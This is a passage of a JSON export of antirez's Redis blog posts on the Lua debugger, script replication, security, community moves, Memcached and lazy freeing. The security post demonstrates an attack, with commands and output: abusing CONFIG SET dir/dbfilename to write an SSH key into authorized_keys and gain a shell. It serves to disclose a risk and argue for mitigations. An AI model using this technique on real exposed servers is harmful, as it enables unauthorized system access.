Lua var dumps to len.                      Specifying zero as  means unlimited. [a]abort             Stop the execution of the script. In sync                      mode dataset changes will be retained.  Debugger functions you can call from Lua scripts: redis.debug()        Produce logs in the debugger console. redis.breakpoint()   Stop execution like if there was a breakpoing.                      in the next line of code. lua debugger>  How it works? ---  The whole debugger is pretty much a self contained block of code, and consists of 1300 lines of code, mostly inside scripting.c, but a few inside redis-cli.c, in order to implement the CLI special mode acting as a client for the debugger. As already said this is a server-client remote debugger.  The Lua C API has a debugging interface that\u2019s pretty useful. Is not a debugger per-se, but offers the primitives you need in order to write a debugger. However writing a debugger in the context of Redis was a bit less trivial that writing a Lua stand-alone debugger. In order to debug the script you have callbacks executed while the script is running. But when Redis is running a script, we are in the context of EVAL, executing a client command. How to do I/O there if we are blocked? Also what happens to the Redis server? Even if debugging must be performed in a development server and not into a production server, to completely hang the instance may not be a good idea. Maybe other developers want to use the instance, or the single developer that is debugging the script wants to create a new parallel debugging session. And finally, what about rolling back the changes so that the same script can be tested again and again with the same Redis data set, regardless of the changes it does while we are debugging? Determinism is gold in the context of debugging.  So I needed a complex implementation, apparently. Or I needed to cheat big time, and find a strange solution to the problem involving a lot less code and complexity, but giving 90% of the benefits I was looking for. This odd solution turned out to be the following:  * When a debugging session starts, fork() Redis. * Capture the client file descriptor, and do direct, blocking I/O while the debugging session is active. * Use the Redis protocol, but a trivial subset that can be implemented in a couple of lines of code, so that we don\u2019t re-enter the Redis event loop at all. The I/O is part of the debugger.  After 400 lines of code I had all the basic working, so the rest was just a matter of adding features and fixing bugs and corner cases.  This gives us everything we needed: the server is not blocked since each debugging session is a separated process. We don\u2019t need to re-enter the event loop from within the middle of an EVAL call, and we have rollback for free.  However, there is also a synchronous mode available, that blocks the server, in the case you really need to debug something while preserving the changes to the dataset. I\u2019ve the feeling this will not be used much at all but to add this mode was a matter of not forking and handling the cleanup of the client at the end, so I added this mode as well.  On top of that it was possible to add everything else using a Lua \u201cline\u201d hook in order to implement stepping and breakpoints. Since the debugger is integrated inside Redis itself, it was trivial to capture all the Redis calls to show the user what was happening. The I/O model is also trivial, we just read input from the user and output appending to a buffer. Every time the debugger stops at some point, the output is flushed to the client as an array of \u201cstatus replies\u201d. The prefix of each line hints redis-cli about the colorization to provide.  Because of this design, the debugger was working after 2 days and was complete after 4 days of work. Moreover this design allowed me to write completely self contained code, so the debugger interacts almost zero with the rest of Redis. This will make possible to release it with Redis 3.2 in December.  A simple way to make the debugger much more powerful almost for free was to add two new Redis Lua calls: redis.breakpoint() and redis.debug(), that respectively can simulate a breakpoint inside the debugger (to the next line to be executed), or log Lua objects in the debugger console. This way you can add breakpoints that only fire when something interesting happens:      if some_odd_condition then redis.breakpoint() end  This effectively replaces a lot of complex features you may add into a debugger. However we also have all the normal features directly inside the debugger, like static breakpoints, the ability to observe the state, and so forth.  I\u2019m very interested in what users writing complex scripts will think about it! We\u2019ll see.  Script effects replication ---  Before understanding why replicating just the *effects* of a script is interesting, it\u2019s better to understand why instead by default replicating the script itself, to be re-executed by slaves, was considered the best option and is anyway the default. The central matter is: bandwidth between the master and the salve, and in general the ability of the slave to \u201cfollow\u201d the master (keep in sync without too much delay) and don\u2019t lag behind.  Think at this small Redis Lua script:      local i;     for i=0,1000000 do         redis.call(\u201clpush\u201d,KEYS[1],ARGV[1])     end  It appends 1 million elements to the specified list and runs in 0.75 seconds in my testing environment. It\u2019s just a few bytes, and runs inside the server, so replicating this script as script, and not as the 1 million commands resulting from the script execution, makes a lot of sense.  There are scripts which are exactly the opposite. At the other side of the spectrum there is a script that calculates the average of 1 million integer elements stored into a list, and stores the result setting some key with SET.  The effect of the script could be just: SET somekey 94.29  But the actual execution is maybe 2 seconds of computation. Replicating this script as the resulting command is much better. However there is a difference between replicating scripts and replicating effects: both are optimal or suboptimal depending on the use case, but replicating scripts always work, even when it\u2019s inefficient. It never creates a situation where the replication link has to transfer huge amount of data, nor it creates a situation where the slave has to do a lot more work than the master. This is why so far Redis always used to replicate scripts verbatim.  However the most interesting part perhaps is that\u2019s not just a matter of efficiency. When replicating scripts we need that each script is a *pure function*. Scripts executed with the same initial dataset, must produce always the same result. This requirement, prevents users from writing scripts using, for example, the TIME command, or SRANDMEMBER. Redis detects this dangerous condition and stops the script as soon as the first write command is going to be called.  Yet there are many use cases for scripts using the current time, random numbers or random elements. Replicating the effects of the script also overcomes this limitation.  So finally, and thanks to refactoring performed inside Redis in the previous months, it was possible to implement opt-in support for scripts effects replication. It is as trivial as calling, at the start of the script, the following command:      redis.replicate_commands()     \u2026 do something with the script \u2026  The script will be replicated only as a set of write commands. Actually there is no need to call replicate_commands() as the first command. It is enough to call it before any write, so the Lua script may even check the work to do and select the right replication model. If writes were already performed when replicate_commands() is called, it just returns false, and the normal whole script replication will be used, so the command will never prevent the script from running, even when misused.  However we did not resisted to the temptation of doing more advanced and possibly dangerous things. I designed this feature with my colleague Yossi Gottleib from Redis Labs, and he had a very compelling use case for a dangerous feature allowing the exclusion of selected commands from the replication stream.  The idea is that your script may do something like that:  1) Call certain commands that write temporary values. Think at intersections between sets just to have a mental model. 2) Perform some aggregation. 3) Store a small result as the effect of the script. 4) Discard the temporary values.  There are a few legitimate use cases for the above pattern, and guess what, you don\u2019t want to replicate the temporary writes to your AOF and slaves. You want replicate just step \u201c3\u201d. So in the end we decided that, when script effects replication is enabled, it is possible for the brave user, to select what replicate and what not, by using the following API:      redis.set_repl(redis.REPL_ALL); -- The default     redis.set_repl(redis.REPL_NONE); -- No replication at all     redis.set_repl(redis.REPL_AOF); -- Just AOF replication     redis.set_repl(redis.REPL_SLAVE); -- Just slaves replication  There is a lot of room for misuse, but non expert users are very unlikely to touch this feature at all, and it can benefit who knows what to do with powerful tools.  ETA ---  Both features will be available into Redis 3.2, that will be out as an RC in mid December 2015. Redis 3.2 is going to have many interesting new features at API level, exposed to users. A big part of the user base asked for this, after a period where we focused more into operations and internals maturity.  Feel free to ask questions in the comments if you want to know more or have any doubt.  Hacker News thread is here: https://news.ycombinator.com/item?id=10594236 Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2015-11-19T11:23:27Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 6975.9500078, "slug": "recent-improvements-to-redis-lua-scripting-43", "topics": []}}, {"model": "app.post", "pk": 44, "fields": {"title": "A few things about Redis security", "link": "http://antirez.com/news/96", "source": 1, "normalized_link": "antirez.com/news/96", "summary": "IMPORTANT EDIT: Redis 3.2 security improved by implementing protected mode. You can find the details about it here: https://www.reddit.com/r/redis/comments/3zv85m/new_security_feature_redis_protected_mode/  From time to time I get security reports about Redis. It\u2019s good to get reports, but it\u2019s odd that what I get is usually about things like Lua sandbox escaping, insecure temporary file creation, and similar issues, in a software which is designed (as we explain in our security page here http://redis.io/topics/security) to be totally insecure if exposed to the outside world.  Yet these bug reports are often useful since there are different levels of security concerning any software in general and Redis specifically. What you can do if you have access to the database, just modify the content of the database itself or compromise the local system where Redis is running?  How important is a given security layer in a system depends on its security model. Is a system designed to have untrusted users accessing it, like a web server for example? There are different levels of authorization for different kinds of users?  The Redis security model is: \u201cit\u2019s totally insecure to let untrusted clients access the system, please protect it from the outside world yourself\u201d. The reason is that, basically, 99.99% of the Redis use cases are inside a sandboxed environment. Security is complex. Adding security features adds complexity. Complexity for 0.01% of use cases is not great, but it is a matter of design philosophy, so you may disagree of course.  The problem is that, whatever we state in our security page, there are a lot of Redis instances exposed to the internet unintentionally. Not because the use case requires outside clients to access Redis, but because nobody bothered to protect a given Redis instance from outside accesses via fire walling, enabling AUTH, binding it to 127.0.0.1 if only local clients are accessing it, and so forth.  Let\u2019s crack Redis for fun and no profit at all given I\u2019m the developer of this thing ===  In order to show the Redis \u201csecurity model\u201d in a cruel way, I did a quick 5 minutes experiment. In our security page we hint at big issues if Redis is exposed. You can read: \u201cHowever, the ability to control the server configuration using the CONFIG command makes the client able to change the working directory of the program and the name of the dump file. This allows clients to write RDB Redis files at random paths, that is a security issue that may easily lead to the ability to run untrusted code as the same user as Redis is running\u201d.  So my experiment was the following: I\u2019ll run a Redis instance in my Macbook Air, without touching the computer configuration compared to what I\u2019ve currently. Now from another host, my goal is to compromise my laptop.  So, to start let\u2019s check if I can access the instance, which is a prerequisite:  $ telnet 192.168.1.11 6379 Trying 192.168.1.11... Connected to 192.168.1.11. Escape character is '^]'. echo \"Hey no AUTH required!\" $21 Hey no AUTH required! quit +OK Connection closed by foreign host.  Works, and no AUTH required. Redis is unprotected without a password set up, and so forth. The simplest thing you can do in such a case, is to write random files. Guess what? my Macbook Air happens to run an SSH server. What about trying to write something into ~/ssh/authorized_keys in order to gain access?  Let\u2019s start generating a new SSH key:  $ ssh-keygen -t rsa -C \"crack@redis.io\" Generating public/private rsa key pair. Enter file in which to save the key (/home/antirez/.ssh/id_rsa): ./id_rsa Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in ./id_rsa. Your public key has been saved in ./id_rsa.pub. The key fingerprint is: f0:a1:52:e9:0d:5f:e4:d9:35:33:73:43:b4:c8:b9:27 crack@redis.io The key's randomart image is: +--[ RSA 2048]----+ |          .   O+.| |       . o o..o*o| |      = . + .+ . | |     o B o    .  | |    . o S    E . | |     .        o  | |                 | |                 | |                 | +-----------------+  Now I\u2019ve a key. My goal is to put it into the Redis server memory, and later to transfer it into a file, in a way that the resulting authorized_keys file is still a valid one. Using the RDB format to do this has the problem that the output will be binary and may in theory also compress strings. But well, maybe this is not a problem. To start let\u2019s pad the public SSH key I generated with newlines before and after the content:  $ (echo -e \"\\n\\n\"; cat id_rsa.pub; echo -e \"\\n\\n\") > foo.txt  Now foo.txt is just our public key but with newlines. We can write this string inside the memory of Redis using redis-cli:  ~~~~~~~~~~~~~~~~~~~ NOTE: The following steps were altered in trivial ways to avoid that script kiddies cut & paste the attack, because from the moment this attack was published several Redis instances were compromised around the globe. ~~~~~~~~~~~~~~~~~~~  $ redis-cli -h 192.168.1.11 192.168.1.11:6379> config set dbfilename \"backup.rdb\" OK 192.168.1.11:6379> save OK (Ctrl+C)  $ redis-cli -h 192.168.1.11 echo flushall $ cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit  Looks good. How to dump our memory content into the authorized_keys file? That\u2019s kinda trivial.  $ redis-cli -h 192.168.1.11 192.168.1.11:6379> config set dir /Users/antirez/.ssh/ OK 192.168.1.11:6379> config get dir 1) \"dir\" 2) \"/Users/antirez/.ssh\" 192.168.1.11:6379> config set dbfilename \"authorized.keys\" OK 192.168.1.11:6379> save OK  At this point the target authorized keys file should be full of garbage, but should also include our public key. The string does not have simple patterns so it\u2019s unlikely that it was compressed inside the RDB file. Will ssh be so naive to parse a totally corrupted file without issues, and accept the only sane entry inside?  $ ssh -i id_rsa antirez@192.168.1.11 Enter passphrase for key 'id_rsa': Last login: Mon Nov  2 15:58:43 2015 from 192.168.1.10 ~ \u27a4 hostname Salvatores-MacBook-Air.local  Yes. I successfully gained access as the Redis user, with a proper shell, in like five seconds. Courtesy of a Redis instance unprotected being, basically, an on-demand-write-this-file server, and in this case, by ssh not being conservative enough to deny access to a file which is all composed of corrupted keys but for one single entry. However ssh is not the problem here, once you can write files, even with binary garbage inside, it\u2019s a matter of time and you\u2019ll gain access to the system in one way or the other.  How to fix this crap? ===  We say Redis is insecure if exposed, and the security model of Redis is to be accessed only by authorized and trusted clients. But this is unfortunately not enough. Users will still run it unprotected, and even worse, there is a tension between making Redis more secure *against* deployment errors, and making Redis easy to use for people just using it for development or inside secure environments where limits are not needed.  Let\u2019s make an example. Newer versions of Redis ship with the example redis.conf defaulting to \u201cbind 127.0.0.1\u201d. If you run the server without arguments, it will still bind all interfaces, since I don\u2019t want to annoy users which are likely running Redis for development. To have to reconfigure an example server just to allow connections from other hosts is kinda a big price to pay, to win just a little bit of security for people that don\u2019t care. However the example redis.conf that many users use as a template for their configuration, defaults to binding the localhost interface. Hopefully less deployments errors will be made.  However this measures are not very effective, because unfortunately what most security unaware users will do after realizing that binding 127.0.0.1 is preventing them from connecting clients from the outside, is to just drop the bind line and restart. And we are back to the insecure configuration.  Basically the problem is finding a compromise between the following three things:  1. Making Redis accessible without annoyances for people that know what they do.  2. Making Redis less insecure for people that don\u2019t know what they do.  3. My bias towards \u201c1\u201d instead of \u201c2\u201d because RTFM.  Users ACLs to mitigate the problem ===  One way to add redundancy to the \u201cisolation\u201d concept of Redis from the outside world is to use the AUTH command. It\u2019s very simple, you configure Redis in order to require a password, and clients authenticate via the AUTH command by using the configured password. The mechanism is trivial: passwords are not hashed, and are stated in cleartext inside the configuration file and inside the application, so it\u2019s like a shared secret.  While this is not resistant against people sniffing your TCP connections or compromising your application servers, it\u2019s an effective layer of security against the obvious mistake of leaving unprotected Redis instances on the internet.  A few notes about AUTH:  1. You can use Redis as an oracle in order to test many passwords per second, but the password does not need to be stored inside a human memory, just inside the Redis config file and client configurations, so pick a very large one, and make it impossible to brute force.  2. AUTH is sent when the connection is created, and most sane applications have persistent connections, so it is a very small cost to pay. It\u2019s also an extremely fast command to execute, like GET or SET, disk is not touched nor other external system.  3. It\u2019s a good layer of protection even for well sandboxed environments. For an error an instance may end exposed, if not to the internet, at least to clients that should not be able to talk with it.  Maybe evolving AUTH is the right path in order to gain more security, so some time ago I published a proposal to add \u201creal users\u201d in Redis: https://github.com/redis/redis-rcp/blob/master/RCP1.md  This proposal basically adds users with ACLs. It\u2019s very similar to AUTH in the way it works and in the speed of execution, but different users have different capabilities. For example normal users are not able to access administrative commands by default, so no \u201cCONFIG SET dir\u201d for them, and no issues like the exploit above.  The default user can yet run the normal commands (so the patches people sent me about Lua sandboxing, that I applied, are very useful indeed), and an admin user must be configured in order to use administration commands. However what we could do to make Redis more user friendly is to always have an \u201cadmin\u201d user with empty password which is accepted if the connection comes from the loopback interface (but it should be possible to disable this feature).  ACLs, while not perfect, have certain advantages. When Redis is exposed to the internet in the proper way, proxied via SSL, to have an additional layer of access control is very useful. Even when no SSL is used since we have just local clients, to protect with more fine grained control what clients can do has several advantages. For instance it can protect against programming or administration errors: FLUSHALL and FLUSHDB could be not allowed to normal users, the client for a Redis monitoring service would use an user only allowing a few selected commands, and so forth.  Users that don\u2019t care about protecting their instances will stil have a database which is accessible from the outside, but without admin commands available, which still makes things insecure from the point of view of the data contained inside the database, but more secure from the point of view of the system running the Redis instance.  Basically it is impossible to reach the goal of making Redis user friendly by default and resistant against big security mistakes of users spinning an instance bound to a public IP address. However fixing bugs in the API that may allow to execute untrusted code with the same privileges of the Redis process, shipping a more conservative default configuration, and implementing multiple users with ACLs, could improve the current state of Redis security without impacting much the experience of normal Redis users that know what they are doing.  Moreover ACLs have the advantage of allowing application developers to create users that match the actual limits of specific clients in the context of the application logic, making mistakes less likely to create big issues.  A drawback of even this simple layer of security is that it adds complexity, especially in the context of replication, Redis Sentinel, and other systems that must all be authentication aware in order to work well in this new context. However it\u2019s probably an effort that must be incrementally done.  Hacker News: https://news.ycombinator.com/item?id=10537852  Reddit: https://www.reddit.com/r/redis/comments/3rby8c/a_few_things_about_redis_security/ Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2015-11-03T08:53:04Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 6945.0294967, "slug": "a-few-things-about-redis-security-44", "topics": []}}, {"model": "app.post", "pk": 45, "fields": {"title": "Moving the Redis community on Reddit", "link": "http://antirez.com/news/95", "source": 1, "normalized_link": "antirez.com/news/95", "summary": "I\u2019m just back from the Redis Dev meeting 2015. We spent two incredible days talking about Redis internals in many different ways. However while I\u2019m waiting to receive private notes from other attenders, in order to summarize in a blog post what happened and what were the most important ideas exposed during the meetings, I\u2019m going to touch a different topic here. I took the non trivial decision to move the Redis mailing list, consisting of 6700 members, to Reddit.  This looks like a crazy ideas probably in some way, and \u201cto move\u201d is probably not the right verb, since the ML will still exist. However it will only be used in order to receive announcements of new releases, critical informations like security related ones, and from time to time, links to very important discussions that are happening on Reddit.  Why to move? We have a huge mailing list that served us for years at this point, and there is a decent amount of traffic going on. People go there to get some help, to provide new ideas, and so forth. However while we have some traffic the Redis mailing list is IMHO far from the \u201cvital\u201d thing it should be, considering the number of users using Redis currently. For most parts we see the same questions again and again, and is hard to understand if a reply is really worthwhile or not. Moreover an important topic sometimes slides away because new topics arrive, sometimes without getting much attention at all. It\u2019s like if the ML is just a far echo of the Redis popularity, not the center of its community.  Twitter, while being a tool completely unsuitable for becoming the center of a community that needs to discuss things at length, is completely different, and gives me a feedback about how the Redis ML is in some way broken. It\u2019s a lot more vital and it is possible to get quality feedbacks, but everything is limited to 140 characters in flat threads where eventually it is kinda impossible to continue any sane discussion. However Twitter and other signals I get, are the proof that people *moved away* from emails. I bet an huge amount of users subscribed to the ML just archive it into a label to read it never or seldom.  So why Reddit instead? Because it\u2019s the center of the most vital communities on the internet today. Because it\u2019s centered on a voting system, so if an user asks for help, even if you don\u2019t want to contribute, you can use the comment voting to tell the difference between a lame request and a great one, a poor reply and an outstanding one. Reddit also allows to vote the topics so that things which are important for the community will get more contributions. Has a side bar that can be used for FAQs and other important pointers, and has a ton of existing subscribers.  Reddit also contains \u201cgamification\u201d elements that may be useful and funny. For example you can associate small sentences or images to your username in a given sub-reddit, in order to state, for example, if you use Redis for caching, as a store, for messaging or whatever. Your reply in a given context can be read more clearly if it is possible to understand what kind of Redis user you are.  It is possible to write guidelines in the submission page, so that people realize what to provide before posting. For example we\u2019ll have warnings telling you to post the INFO output of your master and slaves if you want us to investigate your replication issues.  So, what happens now? I asked Reddit admins to get access to /r/redis, which is a sub created years ago but not actively administered apparently. When I receive the admin privileges I\u2019ll setup the sub in order to only accent comment submissions (not direct links, you\u2019ll be still able to post a link if you comment it). At this point the Redis ML will be modified in order to moderate each single message, we\u2019ll advice people posting help questions to go on Reddit. The Redis.io community page will be updated to instruct new users about Reddit being our primary discussion forum.  Why not using Discourse or Stack Overflow, you\u2019ll ask? SO is great but is not suitable for general conversation, and we need this a lot. People will continue to post Redis questions on SO and we\u2019ll continue to reply, of course. Discourse is more an evolution of the mailing list we are using, but is not technically speaking a \u201csocial site\u201d, we want to go where communities are already and where voting things is the main idea, so that as the Redis community grow we find a way to filter the most interesting contribs and highlight them.  Maybe the experiment will fail and we\u2019ll return back to the mailing list, or we\u2019ll try Discourse, but I think a too important change in the way programmers communicate is happening in order to ignore it. I must try. I think email lost in some way, it is no longer something scalable. For me it lost several years ago, I rarely reply to emails at all, since they are a tool that does not take into account people inability to scale reading too many messages. I hope we\u2019ll have a great time on Reddit. See you there!  P.s. if you are a Reddit admin reading this, please evaluate my request to take ownership of /r/redis here: https://www.reddit.com/r/redditrequest/comments/3pnwrx/requesting_rredis/ Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2015-10-22T08:14:38Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 6921.9382522, "slug": "moving-the-redis-community-on-reddit-45", "topics": []}}, {"model": "app.post", "pk": 46, "fields": {"title": "Clarifications about Redis and Memcached", "link": "http://antirez.com/news/94", "source": 1, "normalized_link": "antirez.com/news/94", "summary": "If you know me, you know I\u2019m not the kind of guy that considers competing products a bad thing. I actually love the users to have choices, so I rarely do anything like comparing Redis with other technologies. However it is also true that in order to pick the right solution users must be correctly informed.  This post was triggered by reading a blog post published by Mike Perham, that you may know as the author of a popular library called Sidekiq, that happens to use Redis as backend. So I would not consider Mike a person which is \u201cagainst\u201d Redis at all. Yet in his blog post that you can find at the URL http://www.mikeperham.com/2015/09/24/storing-data-with-redis/ he states that, for caching, \u201cyou should probably use Memcached instead [of Redis]\u201d. So Mike simply really believes Redis is not good for caching, and he arguments his thesis in this way:  1) Memcached is designed for caching. 2) It performs no disk I/O at all. 3) It is multi threaded and can handle 100,000s of requests by scaling multi core.  I\u2019ll address the above statements, and later will provide further informations which are not captured by the above sentences and which are in my opinion more relevant to most caching users and use cases.  Memcached is designed for caching: I\u2019ll skip this since it is not an argument. I can say \u201cRedis is designed for caching\u201d. So in this regard they are exactly the same, let\u2019s move to the next thing.  It performs no disk I/O at all: In Redis you can just disable disk I/O at all if you want, providing you with a purely in-memory experience. Except, if you really need it, you can persist the database only when you are going to reboot, for example with \u201cSHUTDOWN SAVE\u201d. The bottom line here is that Redis persistence is an added value even when you don\u2019t use it at all.  It is multi threaded: This is true, and in my goals there is to make Redis I/O threaded (like in memcached, where the data access itself is not threaded, basically). However Redis, especially using pipelining, can serve an impressive amount of requests per second per thread (half a million is a common figure with very intensive pipelining. Without pipelining it is around 100,000 ops/sec). In the vanilla caching scenario where each Redis instance is the same, works as a master, disk ops are disabled, and sharding is up to the client like in the \u201cmemcached sharding model\u201d, to spin multiple Redis processes per system is not terrible.  Once you do this what you get is a shared-nothing multi threaded setup so what counts is the amount of operations you can serve per single thread. Last time I checked Redis was at least as fast as memcached per each thread. Implementations change over time so the edge today may be of the one or the other, but I bet they provide near performances since they both tend to maximize the resources they can use. Memcached multi threading is still an advantage since it makes things simpler to use and administer, but I think it is not a crucial part.  There is more. Mike talks of operations per second without citing the *quality* of operations. The thing is in systems like Redis and Memcached the cost of command dispatching and I/O is dominating compared to actually touching the in-memory data structures. So basically in Redis executing a simple GET, a SET, or a complex operation like a ZRANK operation is about the same cost. But what you can achieve with a complex operation is a lot more work from the point of view of the application level. Maybe instead of fetching five cached values you can just send a small Lua script. So the actual \u201cscalability\u201d of the two systems have many dimensions, and what you can achieve is one of those.  Of Mike\u2019s concerns the only valid I can see is multi threading which, if we consider Redis in its special case of memcached replacement, may be addressed executing multiple processes, or simply by executing just one since it will be very very hard to saturate one thread doing memcached alike operations.  The real differences \u2014  Now it\u2019s time to talk about the *real* differences between the two systems.  * Memory efficiency  This is where Memcached used to be better than Redis. In a system designed to represent a plain string to string dictionary, it is simpler to make better use of memory. This difference is not dramatic and it\u2019s like 5 years I don\u2019t check it, but it used to be noticeable.  However if we consider memory efficiency of a long running process, things are a bit different. Read the next section.  But again to really evaluate memory efficiency, you should put into the bag that specially encoded small aggregated values in Redis are very memory efficient. For example sets of small integers are represented internally as an array of 8, 16, 32 or 64 bits integers, and are accessed in logarithmic time when you want to check the existence of some since they are ordered, so binary search can be used.  The same happens when you use hashes to represent objects instead of resorting to JSON. So the real memory efficiency must be evaluated with an use case at hand.  * Redis LRU vs Slab allocator  Memcached is not perfect from the point of view of memory utilization. If you happen to have an application that dramatically change the size of the cached values over time, you are likely to incur severe fragmentation and the only cure is a reboot. Redis is a lot more deterministic from this point of view.  Moreover Redis LRU was lately improved a lot, and is now a very good approximation of real LRU. More info can be found here: http://redis.io/topics/lru-cache. If I understand correctly, memcached LRU still expires according to its slab allocator so sometimes the behavior may be far from real LRU, but I would like to hear what experts have to say about this. If you want to test Redis LRU you now can using the redis-cli LRU testing mode available in recent versions of Redis.  * Smart caching  If you want to use Redis for caching, and use it ala-memcached, you are truly missing something. This is the biggest mistake in Mike\u2019s blog post in my opinion. People are switching to Redis more and more because they discovered that they can represent their cached data in more useful ways. What to retain the latest N items of something? Use a capped list. Want to take a cached popularity index? Use a sorted set, and so forth.  * Persistence and Replication  If you need those, they are very important assets. For example using this model scaling a huge load of reads is very simple. The same about restarts with persistence, the ability to take cache snapshots over time, and so forth. But it\u2019s totally fair to have usages where both features are totally irrelevant. What I want to say here is that there are \u201cpure caching\u201d use cases where persistence and replication are important.  * Observability  Redis is very very observable. It has detailed reporting about a ton of internal metrics, you can SCAN the dataset, observe the expiration of objects. Tune the LRU algorithm. Give names to clients and see them reported in CLIENT LIST. Use \u201cMONITOR\u201d to debug your application, and many other advanced things. I believe this to be an advantage.  * Lua scripting  I believe Lua scripting to be an impressive help in many caching use cases. For example if you have a cached JSON blob, with a Lua command you can extract a single field and return it to the client instead of transferring everything (you can do the same, conceptually, using Redis hashes directly to represent objects).  Conclusions \u2014  Memcached is a great piece of software, I read the source code multiple times, it was a revolution in our industry, and you should check if for you is a better bet compared to Redis. However things must be evaluated for what they are, and in the end I was a bit annoyed to read Mike\u2019s report and very similar reports over the years. So I decided to show you my point of view. If you find anything factually incorrect, ping me and I\u2019ll update the blog post according with \u201cEDIT\u201d sections. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2015-09-26T16:16:14Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 6872.6603856, "slug": "clarifications-about-redis-and-memcached-46", "topics": []}}, {"model": "app.post", "pk": 47, "fields": {"title": "Lazy Redis is better Redis", "link": "http://antirez.com/news/93", "source": 1, "normalized_link": "antirez.com/news/93", "summary": "Everybody knows Redis is single threaded. The best informed ones will tell you that, actually, Redis is *kinda* single threaded, since there are threads in order to perform certain slow operations on disk. So far threaded operations were so focused on I/O that our small library to perform asynchronous tasks on a different thread was called bio.c: Background I/O, basically.  However some time ago I opened an issue where I promised a new Redis feature that many wanted, me included, called \u201clazy free\u201d. The original issue is here: https://github.com/antirez/redis/issues/1748.  The gist of the issue is that Redis DEL operations are normally blocking, so if you send Redis \u201cDEL mykey\u201d and your key happens to have 50 million objects, the server will block for seconds without serving anything in the meantime. Historically this was accepted mostly as a side effect of the Redis design, but is a limit in certain use cases. DEL is not the only blocking command, but is a special one, since usually we say: Redis is very fast as long as you use O(1) and O(log_N) commands. You are free to use O(N) commands but be aware that it\u2019s not the case we optimized for, be prepared for latency spikes.  This sounds reasonable, but at the same time, even objects created with fast operations need to be deleted. And in this case, Redis blocks.  The first attempt \u2014  In a single-threaded server the easy way to make operations non-blocking is to do things incrementally instead of stopping the world. So if there is to free a 1 million allocations, instead of blocking everything in a for() loop, we can free 1000 elements each millisecond, for example. The CPU time used is the same, or a bit more, since there is more logic, but the latency from the point of view of the user is ways better. Maybe those cycles to free 1000 elements per millisecond were not even used. Avoiding to block for seconds is the key here. This is how many things inside Redis work: LRU eviction and keys expires are two obvious examples, but there are more, like incremental rehashing of hash tables.  So this was the first thing I tried: create a new timer function, and perform the eviction there. Objects were just queued into a linked list, to be reclaimed slowly and incrementally each time the timer function was called. This requires some trick to work well. For example objects implemented with hash tables were also reclaimed incrementally using the same mechanism used inside Redis SCAN command: taking a cursor inside the dictionary and iterating it to free element after element. This way, in each timer call, we don\u2019t have to free a whole hash table. The cursor will tell us where we left when we re-enter the timer function.  Adaptive is hard \u2014  Do you know what is the hard part with this? That this time, we are doing a very special task incrementally: we are freeing memory. So if while we free memory incrementally, the server memory raises very fast, we may end, for the sake of latency, to consume an *unbound* amount of memory. Which is very bad. Imagine this, for example:      WHILE 1         SADD myset element1 element2 \u2026 many many many elements         DEL myset     END  If deleting myset in the background is slower compared to our SADD call adding tons of elements per call, our memory usage will grow forever.  However after a few experiments, I found a way to make it working very well. The timer function used two ideas in order to be adaptive to the memory pressure:  1. Check the memory tendency: it is raising or lowering? In order to adapt how aggressively to free. 2. Also adapt the timer frequency itself based on \u201c1\u201d, so that we don\u2019t waste CPU time when there is little to free, with continuous interruptions of the event loop. At the same time the timer could reach ~300 HZ when really needed.  A small portion of code, from the now no longer existing function implementing this ideas:      /* Compute the memory trend, biased towards thinking memory is raising      * for a few calls every time previous and current memory raise. */     if (prev_mem < mem) mem_trend = 1;     mem_trend *= 0.9; /* Make it slowly forget. */     int mem_is_raising = mem_trend > .1;      /* Free a few items. */     size_t workdone = lazyfreeStep(LAZYFREE_STEP_SLOW);      /* Adjust this timer call frequency according to the current state. */     if (workdone) {         if (timer_period == 1000) timer_period = 20;         if (mem_is_raising && timer_period > 3)             timer_period--; /* Raise call frequency. */         else if (!mem_is_raising && timer_period < 20)             timer_period++; /* Lower call frequency. */     } else {         timer_period = 1000;    /* 1 HZ */     }  It\u2019s a good trick and it worked very well. But still it was kinda sad we have to do this operation in a single thread. There was a lot of logic to handle that well, and anyway when the lazy free cycle was very busy, operations per second were reduced to around 65% of the norm.  Freeing objects in a different thread would be much simpler: freeing is almost always faster than adding new values in the dataset, if there is a thread which is busy doing only free operations. For sure there is some contention between the main thread calling the allocator and the lazy free thread doing the same, but Redis spends a fraction of its time on allocations, and much more time on I/O, command dispatching, cache misses, and so forth.  However there was a big problem with implementing a threaded lazy free: Redis itself. The internal design was totally biased towards sharing objects around. After all they are reference counted right? So why don\u2019t share as much as possible? We can save memory and time. A few examples: if you do SUNIONSTORE you end with shared objects in the target set. Similarly, client output buffers have lists of objects to send to the socket as reply, so during a call like SMEMBERS all the set members may end shared in the output buffer list. So sharing objects sounds so useful, lovely, wonderfully, greatly cool.  But, hey, there is something more here. If after an SUNIONSTORE I re-load the database, the objects will be unshared, so the memory suddenly may jump to more than it was. Not great. Moreover what happens when we send replies to clients? We actually *glue together* objects into plain buffers when they are small, since otherwise doing many write() calls is not efficient! (free hint, writev() does not help). So we are mostly copying already. And in programming when something is not useful, but exists, it is likely a problem.  And indeed each time you had to access a value, inside a key containing an aggregate data type, you had to traverse the following:      key -> value_obj -> hash table -> robj -> sds_string  So what about getting rid of \u201crobj\u201d structures entirely and converting aggregate values to be made just of hash tables (or skiplists) of SDS strings? (SDS is the library we use inside Redis for strings). There is a problem with that. Immagine a command like SADD myset myvalue. We can\u2019t take client->argv[2], for example, and just reference it in the hash table implementing the set. We have to *duplicate* values sometimes and can\u2019t reuse the ones already existing in the client argument vector, created when the command was parsed. However Redis performance is dominated by cache misses, so maybe we can compensate this with one indirection less?  So I started to work to this new lazyfree branch, and tweeting about it on Twitter without any context so that everybody was thinking I was like desperate or crazy (a few eventually asked WTF this lazyfree thing was). So what I did?  1. Change client output buffers to use just dynamic strings instead of robj structures. Values are always copied when there is to create a reply. 2. Convert all the Redis data types to use SDS strings instead of shared robj structures. Sounds trivial? ~800 highly bug 